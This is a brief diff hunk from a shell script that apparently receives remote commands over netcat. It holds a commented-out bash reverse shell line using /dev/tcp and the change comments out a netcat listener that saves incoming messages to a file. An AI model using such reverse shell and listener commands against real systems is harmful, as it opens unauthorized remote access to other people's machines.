@@ -25,7 +25,7 @@ function cmmd(){
 localip=`cat config/ip.txt`
 #/bin/bash -i >& /dev/tcp/$localip/$port 0>&1
 #
-sudo nc -l -p $lport > config/rmsg.txt #&& cat config/rmsg.txt
+#sudo nc -l -p $lport > config/rmsg.txt #&& cat config/rmsg.txt
 #while ! echo exit | sudo nc -l -p $port > config/rmsg.txt 13; do sleep 10; done
 valuec=`cat config/rmsg.txt`
 #decode:
